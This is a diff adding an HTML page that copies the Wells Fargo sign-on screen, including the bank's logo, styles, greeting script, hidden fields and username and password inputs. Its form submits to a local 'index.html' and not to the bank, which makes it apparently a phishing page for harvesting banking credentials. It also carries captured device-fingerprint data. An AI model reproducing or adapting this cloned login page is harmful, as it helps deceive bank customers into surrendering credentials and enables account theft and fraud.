@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="manage-audio.css">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO"
+          crossorigin="anonymous">
+    <link rel="stylesheet" href="https://www.wellsfargo.com/ui/css/homepage-ui/ps-homepage.css">
+
+</head>
+<body class="text-white">
+<header class="ps-masthead presentedElement" role="banner" data-cid="tcm:84-224274-16" data-ctid="tcm:91-223647-32">
+    <div class="ps-masthead-wrapper">
+        <div class="new_logoOuter">
+            <div class="ps-logo">
+                <img src="https://www17.wellsfargomedia.com/assets/images/rwd/wf_logo_220x23.png" alt="Wells Fargo Home Page">
+            </div>
+        </div>
+    </div>
+</header>
+
+<div class="signon-container" data-cid="tcm:84-224415" data-ctid="tcm:83-2046-8">
+    <div class="sign-top">
+        <h2 id="sign-on-header">Good morning</h2>
+        <span>Sign on to manage your accounts.</span>
+
+        <script type="text/javascript" nonce="">
+            (function() {
+                var header =document.getElementById('sign-on-header');
+                var theTime = (new Date()).getHours();
+                /* Good Morning from 3AM to 11AM */
+                if (theTime >= 3 && theTime <= 11) {
+                    header.innerText= "Good morning";
+                } else if (theTime >= 12 && theTime <= 17) /* Good Afternoon from 12PM to 17PM */ {
+                    header.innerText= "Good afternoon";
+                } else /* Good Evening */ {
+                    header.innerText= "Good evening";
+                }
+            })();
+        </script>
+
+
+
+
+        <form autocomplete="off" name="signon" id="frmSignon" action="index.html" method="post" data-login-app="true">
+            <div class="form-field">
+                <label for="userid" id="userid_label" class="id_label">Username</label>
+                <input type="text" accesskey="U" id="userid" class="form-element formElementText login_field signon-in" name="j_username" maxlength="14" value="" autocomplete="off">
+            </div>
+            <div class="form-field mr-tp-10 password-div">
+                <label for="password" id="password_label" class="id_label">Password</label>
+                <input type="password" accesskey="P" id="password" class="form-element formElementPassword login_field signon-in pmask" name="j_password" maxlength="32" autocomplete="off">
+                <a href="#" id="password-eye-icon" class="show-password" role="button" aria-label="show password"><span class="password-visible-icon"></span></a>
+            </div>
+            <div id="saveuid" class="save-username save-us-mb">
+                <input type="checkbox" accesskey="S" id="saveusername" class="c29link" name="saveusername" data-content-id="c29content-save-username" triggerhover="false" isclickable="true">
+                <label for="saveusername" class="lsc saveuser-pd">
+                    Save username
+
+
+                    <span class="hidden">Notice - For your security,
+						we do not recommend using this feature on a shared device.</span></label>
+
+
+
+                <input type="hidden" name="save-username" id="save-username" value="false">
+                <input type="hidden" name="hdnuserid" id="hdnuserid" value="">
+            </div>
+            <div class="form-button">
+                <input type="submit" name="btnSignon" id="btnSignon" class="ps-btn-primary" data-mrkt-tracking-id="3d6c76ba-9d34-4def-977d-a79cb8afc738" value="Sign On">
+
+
+                <a class="enroll" href="https://oam.wellsfargo.com/oamo/identity/authentication?execution=e1s1/">Enroll</a>
+
+            </div>
+            <input type="hidden" name="screenid" value="SIGNON">
+            <input type="hidden" name="origination" value="WebCons">
+            <input type="hidden" name="LOB" value="Cons">
+            <input id="jsenabled" name="jsenabled" type="hidden" value="false">
+            <input id="origin" name="origin" type="hidden" value="cob">
+            <input name="homepage" type="hidden" value="true">
+
+
+            <input name="tgcsi" id="tgcsi" type="hidden" value="0c42cb1a-480e-43fc-9385-e1a5193a3982"><input type="hidden" name="fidoAuth" id="fidoAuth" value="false"><input type="hidden" name="fidoAuthAttachment" id="fidoAuthAttachment" value=""><input name="nds-pmd" type="hidden" value="{&quot;jvqtrgQngn&quot;:{&quot;oq&quot;:&quot;1366:625:1366:728:1366:728&quot;,&quot;wfi&quot;:&quot;flap-152866&quot;,&quot;oc&quot;:&quot;2501pp0s72219oop&quot;,&quot;fe&quot;:&quot;1366k768 24&quot;,&quot;qvqgm&quot;:&quot;-330&quot;,&quot;jxe&quot;:43454,&quot;syi&quot;:&quot;snyfr&quot;,&quot;si&quot;:&quot;si,btt,zc4,jroz&quot;,&quot;sn&quot;:&quot;sn,zcrt,btt,jni&quot;,&quot;us&quot;:&quot;640o43156o9635o2&quot;,&quot;cy&quot;:&quot;Jva32&quot;,&quot;sg&quot;:&quot;{\&quot;zgc\&quot;:0,\&quot;gf\&quot;:snyfr,\&quot;gr\&quot;:snyfr}&quot;,&quot;sp&quot;:&quot;{\&quot;gp\&quot;:gehr,\&quot;ap\&quot;:gehr}&quot;,&quot;sf&quot;:&quot;gehr&quot;,&quot;jt&quot;:&quot;s2nno0055p58o750&quot;,&quot;sz&quot;:&quot;q611s46sn22nns4s&quot;,&quot;vce&quot;:&quot;apvc,0,627s2p27,2,1;fg,0,hfrevq,0,cnffjbeq,0;zz,2r8,1s6,37,;zzf,3s7,0,n,ABC;zzf,3qo,3qo,n,0 1s5,0 315,81,82,-1463,1s22,-2;zzf,n1r,n1r,n,6 0,809 5sr,160,46q,-4so,14o0,30r;zz,7n,1n4,42,;zzf,50n,584,n,1q2 33q,252q 285s,13n2,1907,-15819,5sn50,8p06;zzf,3r7,3r6,n,0 n3,206 838,11q,125,-15276,7s5,-28s2;zzf,3r9,3rn,n,48 0,14s 254,oo,p1,-pp3,1465,-p5;zzf,3rn,3rn,n,ABC;zzf,3s2,3s2,n,ABC;zz,2s5,13r,23,;zzf,r7,3qp,n,9s 0,9s 0,10,s,-598,6p0,1r;zzf,3rs,3rs,n,53 0,83 74,1n,1o,-746,61o,-n;zz,r01,n5,1q8,ogaFvtaba;gf,0,3sq4;zz,1387,11r,1089,;zzf,58o,2713,32,24 0,25 sr0s,163o,qrpq,-4q4pp,4s1ss,15p;zz,qs6,188,27,;zz,1408,1p5,12,;gf,0,7nr4;zzf,513,2711,32,0 41,0 3p217,1945,1000p,-14507p,12o284,-9r0;zzf,27qp,27qp,32,ABC;zzf,2713,2712,32,ABC;gf,0,prr6;zzf,2713,2714,32,ABC;zzf,2705,2705,32,ABC;gf,0,11psr;zz,pr8,1s7,19s,;zz,262s,25n,6s,;zz,73s1,2p8,1np,;gf,0,1p406;zp,9o5,273,28,;zp,507,o0,15,;zp,210,o8,26,;zz,134,159,1r,;zp,rq,16p,1n,;zz,261n,27r,26q,;zzf,npp,rnqo,1r,41 246,2rr 71r,14o,4qp1,-2q8,309,2;gf,0,207q9;zzf,rn65,rn65,1r,ABC;gf,0,2s23r;zzf,rn66,rn66,1r,ABC;gf,0,3qpn4;zzf,rn55,rn55,1r,ABC;gf,0,4p6s9;zzf,rn65,rn65,1r,ABC;gf,0,5o15r;zz,27so07,78,5,;gf,0,2qnp65;zz,s86n8,s1,6,;gf,0,3q330q;zz,699p,51p,3s,;gf,0,3q9pn9;zz,11p78,42q,2,;gf,0,3ro921;zp,q40,1n7,26,;zz,99s,116,100,fvta-ba-urnqre;zz,5o81,o1,5s,;gf,0,3s2o81;zz,46r0,79,2,;gf,0,3s7261;zz,n711,10o,123,;gf,0,401972;zz,3nq7,pq,9,;gf,0,405449;zz,15rn,1r3,141,;zz,q1s7,ns,8,;gf,0,413p2n;zz,8r5p,12o,11n,;gf,0,41pn86;zz,7521,oq,1,;gf,0,423sn7;zz,15ns,31o,s1,;&quot;,&quot;hn&quot;:&quot;Zbmvyyn/5.0 (Jvaqbjf AG 10.0; Jva64; k64) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/101.0 Fnsnev/537.36&quot;,&quot;ns&quot;:&quot;&quot;,&quot;fvq&quot;:&quot;aqfnfyrdcqxh8jy35pe46p&quot;},&quot;fvq&quot;:&quot;&quot;,&quot;jg&quot;:&quot;&quot;}"><input name="ndsid" type="hidden" value="ndsasleqpdku8wl35cr46c"></form>
+    </div>
+    <div class="signon-bottom presentedElement">
+
+        <a href="https://oam.wellsfargo.com/oamo/identity/help/passwordhelp/">Forgot username or password?</a>
+        <a href="/privacy-security/fraud/?linkLoc=signon">Security Center</a>
+        <a href="/privacy-security/?linkLoc=signon">Privacy, Cookies, and Legal</a>
+    </div>
+
+    <div area-hidden="true" class="c29content-tooltip tooltip-top" data-content-id="c29content-save-username" style="display: none;">
+				 <span class="c29close">
+					<p><strong>Notice</strong></p>
+					 <a class="tooltip-close-icon"></a>
+				 </span>
+        <p class="security-text">For your security, we do not recommend using this feature on a shared device.</p>
+    </div>
+
+
+
+    <script type="text/javascript" src="https://connect.secure.wellsfargo.com/auth/static/prefs/login-userprefs.min.js" nonce=""></script><script type="text/javascript" id="ndscript1" src="https://connect.secure.wellsfargo.com/auth/static/prefs/atadun.js"></script>
+
+
+</div>
+</body>
+</html>
